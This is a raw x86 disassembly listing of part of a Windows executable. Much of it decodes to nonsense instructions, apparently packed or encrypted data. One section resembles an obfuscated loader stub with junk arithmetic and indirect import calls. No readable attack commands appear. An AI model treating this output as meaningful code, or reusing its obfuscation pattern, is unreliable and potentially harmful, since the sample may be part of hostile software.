  4057b4:	and    ecx,DWORD PTR [eax]
  4057b6:	xchg   edx,eax
  4057b7:	or     al,BYTE PTR [ebp-0x53]
  4057ba:	dec    esp
  4057bb:	cli    
  4057bc:	mov    DWORD PTR [ebp+eiz*2+0x6],esp
  4057c0:	jle    0x405826
  4057c2:	retf   
  4057c3:	test   eax,0x2c63276
  4057c8:	aam    0xf9
  4057ca:	pop    ebx
  4057cb:	pushf  
  4057cc:	pop    ecx
  4057cd:	sub    esi,edx
  4057cf:	xor    BYTE PTR [ecx+edi*4-0x7af468a6],ch
  4057d6:	ftst   
  4057d8:	or     eax,0x15580b1d
  4057dd:	adc    al,0x59
  4057df:	mov    cl,0x1e
  4057e1:	pop    ecx
  4057e2:	imul   esi,ebp,0x50
  4057e5:	inc    ecx
  4057e6:	dec    esp
  4057e7:	jbe    0x4057e5
  4057e9:	add    DWORD PTR [edx+0x60],0x62
  4057ed:	dec    esi
  4057ee:	jae    0x405861
  4057f0:	cs or  bh,al
  4057f3:	aam    0xb1
  4057f5:	int3   
  4057f6:	sub    al,0x50
  4057f8:	fisub  DWORD PTR [edi+0x222f6e37]
  4057fe:	mov    ds:0x98675488,al
  405803:	mov    bh,0x75
  405805:	int    0xf6
  405807:	xor    al,0x30
  405809:	rcl    DWORD PTR [ebx],0xf0
  40580c:	add    ch,0x62
  40580f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405810:	popa   
  405811:	adc    cl,BYTE PTR [esp+edi*4-0x71]
  405815:	dec    ebp
  405816:	shr    DWORD PTR [ecx],0x5b
  405819:	dec    eax
  40581a:	fisubr WORD PTR [ebx-0x7de18967]
  405820:	inc    eax
  405821:	leave  
  405822:	cwde   
  405823:	scas   eax,DWORD PTR es:[edi]
  405824:	mov    ebx,0xb86d140f
  405829:	pop    esp
  40582a:	push   0xbfcbc536
  40582f:	dec    ebx
  405830:	mov    ah,0x92
  405832:	pushf  
  405833:	bound  edx,QWORD PTR [edx+ecx*2+0x28]
  405837:	add    BYTE PTR [edi+0x3884b303],dh
  40583d:	dec    edi
  40583e:	(bad)  [eax+esi*1]
  405841:	fsubrp st(5),st
  405843:	in     eax,0x5a
  405845:	sbb    al,0xa8
  405847:	lahf   
  405848:	(bad)  [edx]
  40584a:	cmp    DWORD PTR [eax+edi*2-0xa],0x80e31308
  405852:	test   DWORD PTR [ecx+edi*4-0x316851a6],0x6f95aa14
  40585d:	shl    dl,cl
  40585f:	popa   
  405860:	and    esi,DWORD PTR [eax+0x75a0e9b7]
  405866:	push   esi
  405867:	pop    edi
  405868:	retf   
  405869:	sub    DWORD PTR [eax+edx*2-0x4f7fb7f5],esp
  405870:	or     al,bl
  405872:	or     BYTE PTR [edx],al
  405874:	loope  0x4058c1
  405876:	cmp    DWORD PTR [ecx+0x18],edx
  405879:	sub    ah,BYTE PTR [esi]
  40587b:	test   al,0x0
  40587d:	mov    BYTE PTR [edx+0x6a61f1fe],cl
  405883:	fisubr WORD PTR [eax+0x63]
  405886:	jmp    0x4058f3
  405888:	mov    eax,ds:0x26ba5cb2
  40588d:	lods   eax,DWORD PTR ds:[esi]
  40588e:	mov    bh,dl
  405890:	push   cs
  405891:	stos   DWORD PTR es:[edi],eax
  405892:	jle    0x4058ed
  405894:	je     0x405823
  405896:	mov    ?,WORD PTR [edi+0x21606b7d]
  40589c:	mov    bl,0x9f
  40589e:	mov    eax,ds:0xaffd8bc8
  4058a3:	sar    BYTE PTR [esi],0x3
  4058a6:	mov    ebx,0xc94772ba
  4058ab:	enter  0x50e4,0x91
  4058af:	push   esi
  4058b0:	inc    esi
  4058b1:	and    DWORD PTR [esi],0x46
  4058b4:	retf   
  4058b5:	repnz xor BYTE PTR [ebp+0x6a794773],dl
  4058bc:	cs mov al,0x7b
  4058bf:	adc    al,0xc5
  4058c1:	jecxz  0x405909
  4058c3:	shl    DWORD PTR ds:0x1486cc59,0x54
  4058ca:	inc    esi
  4058cb:	cwde   
  4058cc:	das    
  4058cd:	mov    dl,0x53
  4058cf:	dec    edx
  4058d0:	jp     0x4058eb
  4058d2:	cmp    al,0x29
  4058d4:	xchg   DWORD PTR [eax+0x2],ebp
  4058d7:	inc    ebx
  4058d8:	out    dx,al
  4058d9:	out    0xa5,al
  4058db:	cli    
  4058dc:	std    
  4058dd:	mov    dl,0xb6
  4058df:	daa    
  4058e0:	fild   DWORD PTR ds:0xb4311267
  4058e6:	xchg   ebp,eax
  4058e7:	add    esp,DWORD PTR [ecx+0x458a7e0a]
  4058ed:	add    al,0x9
  4058ef:	push   ss
  4058f0:	(bad)  [edi+0x2f784653]
  4058f6:	cdq    
  4058f7:	(bad)  
  4058f8:	mov    ebp,0xbbb0f5a8
  4058fd:	popf   
  4058fe:	test   DWORD PTR [edi+ecx*8-0x1c],ebp
  405902:	push   esp
  405903:	retf   
  405904:	fwait
  405905:	out    dx,al
  405906:	outs   dx,BYTE PTR ds:[esi]
  405907:	(bad)  
  405908:	mul    DWORD PTR [eax+0xf]
  40590b:	add    esi,0xffffffcf
  40590e:	cmp    edi,DWORD PTR [edi]
  405910:	call   0x69af:0xc245f200
  405917:	inc    ecx
  405918:	lahf   
  405919:	mov    eax,0xfb2896ed
  40591e:	(bad)  
  40591f:	mov    ebx,0x4ce1b96a
  405924:	push   cs
  405925:	push   ecx
  405926:	jecxz  0x40596f
  405928:	xlat   BYTE PTR ds:[ebx]
  405929:	mov    ch,0xdd
  40592b:	xor    bl,BYTE PTR [esi+0x47]
  40592e:	adc    DWORD PTR [eiz*4+0x5284a0f9],esp
  405935:	mov    ds:0x43cc1dbb,al
  40593a:	xchg   ebx,eax
  40593b:	dec    edi
  40593c:	imul   ecx,ebp,0x9fbf1cc8
  405942:	jae    0x40598a
  405944:	pop    edi
  405945:	xor    BYTE PTR [ebx-0x63],cl
  405948:	xchg   ebx,eax
  405949:	xchg   ebx,eax
  40594a:	jge    0x4059be
  40594c:	dec    edx
  40594d:	iret   
  40594e:	pop    edx
  40594f:	lods   al,BYTE PTR ds:[esi]
  405950:	jnp    0x40598b
  405952:	in     al,0x5b
  405954:	xor    al,0x69
  405956:	xor    eax,0xb1d53b1f
  40595b:	and    BYTE PTR [ecx+ebx*2],cl
  40595e:	xchg   edi,eax
  40595f:	enter  0xf841,0xec
  405963:	push   edx
  405964:	lods   eax,DWORD PTR ds:[esi]
  405965:	jb     0x4059b8
  405967:	das    
  405968:	xchg   edi,eax
  405969:	rol    BYTE PTR [esi],0x95
  40596c:	rcl    DWORD PTR [ecx-0x734f362d],1
  405972:	ss je  0x405987
  405975:	scas   al,BYTE PTR es:[edi]
  405976:	test   BYTE PTR [esi-0x3faf2316],ch
  40597c:	bound  eax,QWORD PTR [ecx]
  40597e:	loopne 0x4059a3
  405980:	imul   ecx,DWORD PTR ds:0x3eaf79a3,0xf9f36b20
  40598a:	xor    BYTE PTR [edi],dh
  40598c:	jmp    0x75af:0x4cf21b07
  405993:	(bad)  [ebx+0x704c191e]
  405999:	pop    esp
  40599a:	aas    
  40599b:	jns    0x40595f
  40599d:	aas    
  40599e:	dec    eax
  40599f:	push   ss
  4059a0:	mov    dh,0x73
  4059a2:	test   DWORD PTR [ebx-0x15],edi
  4059a5:	fistp  QWORD PTR [ecx+0x2d]
  4059a8:	pop    ss
  4059a9:	stos   BYTE PTR es:[edi],al
  4059aa:	pop    edi
  4059ab:	cmp    eax,0xf0d7a10b
  4059b0:	loopne 0x405960
  4059b2:	dec    ebx
  4059b3:	sbb    eax,0x91752da6
  4059b8:	hlt    
  4059b9:	or     al,0x11
  4059bb:	clc    
  4059bc:	ffree  st(1)
  4059be:	cmp    bl,BYTE PTR [edi]
  4059c0:	jg     0x4059be
  4059c2:	pushw  0xcc97
  4059c6:	scas   eax,DWORD PTR es:[edi]
  4059c7:	adc    eax,0xe0338bd9
  4059cc:	add    DWORD PTR [edi+ebx*1-0x7a],ebx
  4059d0:	adc    ecx,DWORD PTR [ebx]
  4059d2:	mov    al,0xcd
  4059d4:	ds sbb al,0xc0
  4059d7:	aaa    
  4059d8:	adc    bl,BYTE PTR [esi]
  4059da:	lods   eax,DWORD PTR ds:[esi]
  4059db:	or     eax,0x73504cd6
  4059e0:	xchg   esi,eax
  4059e1:	mov    eax,ds:0x6a45dbfa
  4059e6:	add    cl,ah
  4059e8:	or     esi,DWORD PTR [edx-0x5]
  4059eb:	mov    dl,0xa
  4059ed:	jmp    0xcca053f8
  4059f2:	dec    edx
  4059f3:	sub    dh,BYTE PTR [eax+0x3b]
  4059f6:	mov    al,ds:0x853a57a2
  4059fb:	stos   BYTE PTR es:[edi],al
  4059fc:	mov    ch,0x43
  4059fe:	or     ah,BYTE PTR [eax]
  405a00:	mov    eax,DWORD PTR [di+0x74]
  405a04:	fsub   QWORD PTR [ecx+0x40]
  405a07:	cdq    
  405a08:	mov    WORD PTR [ebp-0x31],gs
  405a0b:	in     eax,0x1
  405a0d:	add    eax,0x2ac12a38
  405a12:	dec    ecx
  405a13:	scas   eax,DWORD PTR es:[edi]
  405a14:	loope  0x405a71
  405a16:	(bad)  
  405a17:	repnz dec ebp
  405a19:	aam    0x99
  405a1b:	sbb    al,0x53
  405a1d:	sbb    DWORD PTR [eax+0x29bce9bc],eax
  405a23:	test   al,0x7
  405a25:	cmp    ebp,DWORD PTR [esi+0x76]
  405a28:	xlat   BYTE PTR ds:[ebx]
  405a29:	mov    dl,0x6
  405a2b:	gs iret 
  405a2d:	pop    ecx
  405a2e:	shl    DWORD PTR [edx],1
  405a30:	jmp    0x9c30:0xd9a5f3fa
  405a37:	jno    0x4059fd
  405a39:	jecxz  0x405a94
  405a3b:	mov    ecx,0xde75f3a6
  405a40:	js     0x4059ed
  405a42:	fmul   st(3),st
  405a44:	and    BYTE PTR [esi+0x4785c9df],dh
  405a4a:	mov    bl,0x97
  405a4c:	mov    al,ds:0x9aff1bcf
  405a51:	mov    ?,WORD PTR [esi+0x40]
  405a54:	add    dl,BYTE PTR [eax]
  405a56:	sbb    ebp,DWORD PTR [esi+ecx*2]
  405a59:	cmc    
  405a5a:	lds    esp,FWORD PTR [edi]
  405a5c:	pop    ebx
  405a5d:	inc    ebx
  405a5e:	int    0x4e
  405a60:	psubq  mm4,mm1
  405a63:	mov    dl,0x75
  405a65:	adc    bl,bl
  405a67:	add    ecx,DWORD PTR [eax-0x57]
  405a6a:	repnz sub ah,ah
  405a6d:	inc    ebx
  405a6e:	xchg   ebp,eax
  405a6f:	mov    ecx,0x99e554a1
  405a74:	gs push es
  405a76:	gs (bad) 
  405a78:	or     dl,BYTE PTR [esi-0x6d7f5b23]
  405a7e:	jne    0x405a27
  405a80:	leave  
  405a81:	fdivp  st(3),st
  405a83:	leave  
  405a84:	adc    eax,0xf062cc02
  405a89:	imul   esp,DWORD PTR [edx],0x3f
  405a8c:	jnp    0x405a26
  405a8e:	add    BYTE PTR [edi],bl
  405a90:	inc    ebx
  405a91:	test   BYTE PTR [ebx-0x2c663c9f],dl
  405a97:	sub    al,0xca
  405a99:	cs push cs
  405a9b:	inc    ecx
  405a9c:	ss xchg esi,eax
  405a9e:	in     eax,dx
  405a9f:	mov    ebp,0x7ce319d5
  405aa4:	popa   
  405aa5:	leave  
  405aa6:	sbb    eax,0x3ae67736
  405aab:	cmp    BYTE PTR [edi+ebp*8+0x73],ch
  405aaf:	and    eax,0x79aee960
  405ab4:	and    bl,ah
  405ab6:	ins    BYTE PTR es:[edi],dx
  405ab7:	loopne 0x405ad4
  405ab9:	in     al,dx
  405aba:	bound  eax,QWORD PTR [edx-0x66]
  405abd:	rol    ch,0x85
  405ac0:	rol    edi,0xbf
  405ac3:	adc    BYTE PTR [eax-0x28f31906],bl
  405ac9:	in     eax,dx
  405aca:	xchg   edi,eax
  405acb:	jnp    0x405a9c
  405acd:	outs   dx,DWORD PTR cs:[esi]
  405acf:	xor    BYTE PTR [edi+0x5a],0xaa
  405ad3:	(bad)  
  405ad4:	xlat   BYTE PTR ds:[ebx]
  405ad5:	ds hlt 
  405ad7:	icebp  
  405ad8:	mov    esp,DWORD PTR ds:[ebx-0x12]
  405adc:	mov    ah,0x9
  405ade:	jnp    0x405aa4
  405ae0:	(bad)  [eax-0x7a]
  405ae3:	fwait
  405ae4:	inc    esi
  405ae5:	cmp    ah,BYTE PTR [ebp+0x7b]
  405ae8:	fwait
  405ae9:	and    al,0x46
  405aeb:	push   eax
  405aec:	pop    esp
  405aed:	hlt    
  405aee:	lea    ecx,[edi-0x3e]
  405af1:	rcr    BYTE PTR [edx+0x2d],1
  405af4:	jb     0x405b64
  405af6:	call   0xcb3353d0
  405afb:	ret    
  405afc:	shl    BYTE PTR [esi-0x55240c95],cl
  405b02:	add    al,0xe0
  405b04:	popf   
  405b05:	bound  ebp,QWORD PTR [edi+0x2e]
  405b08:	jo     0x405b88
  405b0a:	sub    DWORD PTR [esi+0x0],0x64
  405b0e:	bound  esi,QWORD PTR [edi+0x32]
  405b11:	mov    BYTE PTR [edx+ebp*1-0x79c036b8],ah
  405b18:	fld    QWORD PTR [edx+0x37ca6c9e]
  405b1e:	into   
  405b1f:	cmp    al,0x9
  405b21:	jp     0x405b7d
  405b23:	lahf   
  405b24:	(bad)  
  405b25:	or     DWORD PTR [ebx+0xa],ebp
  405b28:	mov    edx,0xeffa9746
  405b2d:	inc    eax
  405b2e:	in     eax,0xb6
  405b30:	ficomp DWORD PTR [esi]
  405b32:	pop    esi
  405b33:	sbb    eax,0x7b1fbdb2
  405b38:	jge    0x405b03
  405b3a:	push   0x1a
  405b3c:	popf   
  405b3d:	jl     0x405b0b
  405b3f:	(bad)  
  405b41:	(bad)  
  405b44:	das    
  405b45:	(bad)  
  405b46:	jp     0x405b6d
  405b48:	out    0xa6,eax
  405b4a:	fidiv  DWORD PTR ds:0x9ef63eac
  405b50:	xchg   ecx,eax
  405b51:	dec    esp
  405b52:	stos   BYTE PTR es:[edi],al
  405b53:	jns    0x405ae1
  405b55:	stc    
  405b56:	add    edi,ebx
  405b58:	(bad)  
  405b59:	out    dx,eax
  405b5a:	lock lea esp,[esi]
  405b5d:	sahf   
  405b5e:	sahf   
  405b5f:	mov    gs:0x875fcb69,eax
  405b65:	xor    ebx,DWORD PTR [ecx]
  405b67:	cwde   
  405b68:	pop    edx
  405b69:	imul   ecx,DWORD PTR [ebp+0x76],0x69
  405b6d:	mov    WORD PTR [edx+0x17],fs
  405b70:	aaa    
  405b71:	inc    ebx
  405b72:	rcl    bl,cl
  405b74:	xor    DWORD PTR [eax+0x2b],eax
  405b77:	imul   eax,DWORD PTR [edi+esi*8-0x77fa22ce],0xffffffd5
  405b7f:	dec    eax
  405b80:	sbb    eax,0x7b54bb3
  405b85:	icebp  
  405b86:	push   edi
  405b87:	lods   al,BYTE PTR ds:[esi]
  405b88:	xor    DWORD PTR [ebx+ebp*1+0x4096369e],ebx
  405b8f:	test   BYTE PTR [ebx],dh
  405b91:	ror    DWORD PTR [ecx],0xb0
  405b94:	leave  
  405b95:	dec    ebp
  405b96:	or     esp,ebp
  405b98:	xlat   BYTE PTR ds:[ebx]
  405b99:	adc    ebp,DWORD PTR [ebp-0x11]
  405b9c:	dec    eax
  405b9d:	push   0xffffff97
  405b9f:	out    dx,eax
  405ba0:	xchg   edi,eax
  405ba1:	fs ds pop eax
  405ba4:	clc    
  405ba5:	or     BYTE PTR [eax+0x19],dh
  405ba8:	mov    esi,0x7330a354
  405bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bae:	add    al,0xcf
  405bb0:	mov    ds:0x72b6646,eax
  405bb5:	dec    edx
  405bb6:	iret   
  405bb7:	cmp    edi,ebp
  405bb9:	gs (bad) 
  405bbb:	(bad)  [eax-0x3b4075ed]
  405bc1:	ss dec eax
  405bc3:	imul   esp,esi,0xffffffa8
  405bc6:	sub    al,BYTE PTR [ecx-0x7817db5a]
  405bcc:	aam    0xb
  405bce:	rcl    DWORD PTR [eax+esi*4+0x37],0x60
  405bd3:	out    dx,eax
  405bd4:	shr    cl,1
  405bd6:	lods   eax,DWORD PTR ds:[esi]
  405bd7:	pop    ecx
  405bd8:	inc    esp
  405bd9:	xchg   edx,eax
  405bda:	jns    0x405c47
  405bdc:	mov    eax,0x53ad4434
  405be1:	push   cs
  405be2:	shr    DWORD PTR [esi+0x18],0x36
  405be6:	adc    BYTE PTR [ebp+0x56],0x3f
  405bea:	test   ecx,eax
  405bec:	mov    edi,0x5920bd56
  405bf1:	div    DWORD PTR [edi+0x53]
  405bf4:	jbe    0x405c71
  405bf6:	imul   esp,eax,0x74146794
  405bfc:	leave  
  405bfd:	mov    al,0x6
  405bff:	or     ebp,0x59
  405c02:	jae    0x405b86
  405c04:	sub    al,0xa0
  405c06:	fstp   QWORD PTR [edx+0x1d]
  405c09:	fwait
  405c0a:	stos   DWORD PTR es:[edi],eax
  405c0b:	dec    ecx
  405c0c:	sub    BYTE PTR [eax-0x7ce832fc],bl
  405c12:	data16 or BYTE PTR [eax],al
  405c15:	and    al,0xdf
  405c17:	mov    ds:0x2648fce4,eax
  405c1c:	nop
  405c1d:	xor    BYTE PTR [edx],bh
  405c1f:	mov    al,BYTE PTR [edi]
  405c21:	jns    0x405beb
  405c23:	repz mov edi,0xceb904e5
  405c29:	jmp    0xbc8c433f
  405c2e:	fs push eax
  405c30:	int3   
  405c31:	inc    esp
  405c32:	sbb    ch,BYTE PTR [eax-0x5ad374f]
  405c38:	aas    
  405c39:	xchg   ecx,eax
  405c3a:	sbb    edx,DWORD PTR [edi+0x3056d55b]
  405c40:	push   edi
  405c41:	mov    ebp,0xabd33fb8
  405c46:	ret    
  405c47:	jne    0x405cbe
  405c49:	iret   
  405c4a:	jno    0x405c6f
  405c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c4d:	jo     0x405c60
  405c4f:	loop   0x405c47
  405c51:	call   0x1996:0xeb6c889c
  405c58:	or     edx,eax
  405c5a:	std    
  405c5b:	ins    BYTE PTR es:[edi],dx
  405c5c:	test   eax,0x83e41d74
  405c61:	lds    edx,FWORD PTR [edi+0x5a35a544]
  405c67:	nop
  405c68:	mov    bh,BYTE PTR [ecx+0x40]
  405c6b:	pop    edi
  405c6c:	pop    esi
  405c6d:	leave  
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423533
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx-0x3fd07a37]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  ebx,QWORD PTR [eax-0x6c980c28]
  405e16:	fpatan 
  405e18:	lods   al,BYTE PTR ds:[esi]
  405e19:	xor    al,0xdb
  405e1b:	retf   
  405e1c:	xchg   esi,eax
  405e1d:	ror    DWORD PTR [ecx+0x4f],0xa3
  405e21:	addr16 xchg esi,eax
  405e23:	nop
  405e24:	jp     0x405e24
  405e26:	dec    edx
  405e27:	in     eax,dx
  405e28:	xor    ebx,0x919605a4
  405e2e:	inc    esi
  405e2f:	retf   
  405e30:	xchg   esi,eax
  405e31:	inc    esi
  405e32:	fst    QWORD PTR [eax]
  405e34:	sub    eax,0x57562dcf
  405e39:	xchg   edx,eax
  405e3a:	shr    edi,1
  405e3c:	dec    eax
  405e3d:	ja     0x405eba
  405e3f:	inc    BYTE PTR [eax-0x64b9cf66]
  405e45:	cmp    DWORD PTR [ebp-0x72ec8e37],0x29038ffd
  405e4f:	jnp    0x405e67
  405e51:	mov    ds:0xd1803d06,al
  405e56:	out    dx,al
  405e57:	(bad)  
  405e58:	or     ah,dh
  405e5a:	cmp    BYTE PTR [edi*2+0x5c8a8cd4],ah
  405e61:	jmp    0x405e2f
  405e63:	pop    ebx
  405e64:	ret    
  405e65:	or     DWORD PTR [esi-0x7a],0xa186b4d2
  405e6c:	jae    0x405e1e
  405e6e:	mov    ah,0xa0
  405e70:	in     al,0xf4
  405e72:	jecxz  0x405e8f
  405e74:	jmp    0xe78f6794
  405e79:	daa    
  405e7a:	push   eax
  405e7b:	mov    ds:0x642f4e09,eax
  405e80:	mov    DWORD PTR [esi-0x2a358206],esp
  405e86:	xchg   edx,eax
  405e87:	and    edx,DWORD PTR [ebx-0x29be28e2]
  405e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e8e:	pop    ebp
  405e8f:	mov    ch,0xa7
  405e91:	mov    al,ds:0x3b2db6ee
  405e96:	aas    
  405e97:	outs   dx,DWORD PTR ds:[esi]
  405e98:	cmp    BYTE PTR [edi+0x55],dl
  405e9b:	inc    esp
  405e9c:	jle    0x405e77
  405e9e:	out    dx,al
  405e9f:	cmp    DWORD PTR [edi-0x7135ae7],0xdcafb934
  405ea9:	jge    0x405f01
  405eab:	pop    esi
  405eac:	fnstenv [edi]
  405eae:	sbb    DWORD PTR [edx-0x4ba3c5b5],0x30
  405eb5:	rcl    esp,0xf
  405eb8:	or     BYTE PTR [edx+eiz*8-0x25eb22a8],bh
  405ebf:	adc    DWORD PTR [edx],0x1165108b
  405ec5:	fadd   QWORD PTR [ecx]
  405ec7:	into   
  405ec8:	or     DWORD PTR [ecx],eax
  405eca:	xor    BYTE PTR [ebp+0x3a6b45c2],ah
  405ed0:	or     bh,BYTE PTR [eax+0x7b62f649]
  405ed6:	push   edx
  405ed7:	dec    ebx
  405ed8:	nop
  405ed9:	andnps xmm3,xmm1
  405edc:	fwait
  405edd:	icebp  
  405ede:	pop    ecx
  405edf:	and    BYTE PTR [eax],dh
  405ee1:	dec    sp
  405ee3:	push   ss
  405ee4:	mov    BYTE PTR ds:0x4ea7effe,0x2a
  405eeb:	outs   dx,BYTE PTR ds:[esi]
  405eec:	mov    eax,0x4e3a6927
  405ef1:	clc    
  405ef2:	sbb    eax,ecx
  405ef4:	push   cs
  405ef5:	jnp    0x405f6e
  405ef7:	imul   DWORD PTR [ecx+0x2b]
  405efa:	ret    0xfbf2
  405efd:	aad    0xc6
  405eff:	jmp    0x2b0f96f1
  405f04:	sti    
  405f05:	aaa    
  405f06:	retf   
  405f07:	add    DWORD PTR [ebp+0x47adb71c],esp
  405f0d:	mov    al,dh
  405f0f:	mov    DWORD PTR [edi],ecx
  405f11:	adc    eax,DWORD PTR ds:0x6e92d9f4
  405f17:	mov    dh,0x3d
  405f19:	mov    ebp,edi
  405f1b:	aas    
  405f1c:	ret    0xa598
  405f1f:	mov    eax,0x2325f0d0
  405f24:	adc    al,BYTE PTR [esi]
  405f26:	xchg   edi,eax
  405f27:	mov    cl,0x2b
  405f29:	js     0x405f13
  405f2b:	inc    esi
  405f2c:	dec    ecx
  405f2d:	mov    bh,0x59
  405f2f:	mov    ds:0xef9245ea,al
  405f34:	ret    
  405f35:	test   eax,0x33e968a2
  405f3a:	imul   ecx,DWORD PTR [edi+0x7f110824],0x76
  405f41:	adc    BYTE PTR [ecx+0x6aa09833],0x3b
  405f48:	push   0x26
  405f4a:	jae    0x405fbc
  405f4c:	jno    0x405fa6
  405f4e:	and    BYTE PTR [esi-0x7b],ah
  405f51:	mov    cl,0x35
  405f53:	rcl    ebx,cl
  405f55:	call   0x10ba:0x61242e01
  405f5c:	adc    ebp,ebx
  405f5e:	jle    0x405f65
  405f60:	in     al,0x85
  405f62:	pusha  
  405f63:	cmp    al,BYTE PTR [edx]
  405f65:	adc    edx,edi
  405f67:	mov    eax,ds:0xd9e4cd42
  405f6c:	fcmovnbe st,st(3)
  405f6e:	mov    bh,0x80
  405f70:	das    
  405f71:	mov    edi,0x95439749
  405f76:	xor    bh,BYTE PTR ds:0x76bee61
  405f7c:	iret   
  405f7d:	add    DWORD PTR [ebx+0x52c5314c],eax
  405f83:	jmp    0x9326:0x4eee8b0c
  405f8a:	xchg   esp,eax
  405f8b:	jmp    0x405f71
  405f8d:	in     al,dx
  405f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f8f:	lds    ebx,FWORD PTR [ecx+0x29]
  405f92:	dec    esi
  405f93:	bndstx [ecx-0x71],bnd2
  405f97:	xchg   BYTE PTR [edx],al
  405f99:	out    dx,eax
  405f9a:	jmp    0x8d63:0xa01db281
  405fa1:	pop    edi
  405fa2:	mov    ebp,0x1965e99
  405fa7:	cs cmp al,0x20
  405faa:	les    esi,FWORD PTR ds:0x56e5db79
  405fb0:	cli    
  405fb1:	loop   0x405fc1
  405fb3:	ds dec ecx
  405fb5:	imul   ebx,DWORD PTR [edi-0x1b],0xb805a6b9
  405fbc:	adc    al,0xf0
  405fbe:	je     0x405f92
  405fc0:	xor    DWORD PTR [ecx-0x2d],ebp
  405fc3:	loopne 0x405f48
  405fc5:	sbb    DWORD PTR [ebx-0x4bac95b8],ecx
  405fcb:	rcl    BYTE PTR [ecx-0x72],cl
  405fce:	jo     0x405f94
  405fd0:	jl     0x405f72
  405fd2:	jnp    0x405fb4
  405fd4:	add    cl,BYTE PTR [edi]
  405fd6:	and    edx,DWORD PTR [ecx-0x7c74e43]
  405fdc:	mov    ds:0xa5821d6d,eax
  405fe1:	and    DWORD PTR [eax-0x21],0x13a1498d
  405fe8:	push   es
  405fe9:	pop    edx
  405fea:	mov    bl,0x96
  405fec:	retf   
  405fed:	es in  al,dx
  405fef:	push   ebx
  405ff0:	cmp    ch,BYTE PTR [esi+0x3097fd3f]
  405ff6:	leave  
  405ff7:	mov    edi,0xddc92a21
  405ffc:	mov    bl,0xc1
  405ffe:	sbb    DWORD PTR [ebp+0x53cb0f38],ecx
  406004:	and    al,0x77
  406006:	or     bl,ah
  406008:	mov    edi,0x6089ff23
  40600d:	icebp  
  40600e:	cvtps2pd xmm4,xmm4
  406011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406012:	inc    eax
  406013:	scas   al,BYTE PTR es:[edi]
  406014:	mov    ecx,0x84f0ef2e
  406019:	aad    0xee
  40601b:	add    ecx,DWORD PTR [ebp+0x426145cd]
  406021:	stc    
  406022:	mov    DWORD PTR [edi],eax
  406024:	mov    ah,0xd0
  406026:	pop    esi
  406027:	mov    eax,ds:0x85aec60b
  40602c:	mov    ebp,0x1613485b
  406031:	jl     0x405ffc
  406033:	lods   al,BYTE PTR ds:[esi]
  406034:	xchg   BYTE PTR [edi-0x3f8e01a3],bh
  40603a:	mov    eax,0x9b1d9a6a
  40603f:	xchg   edx,eax
  406040:	xor    dh,BYTE PTR [ebp+0x2f]
  406043:	std    
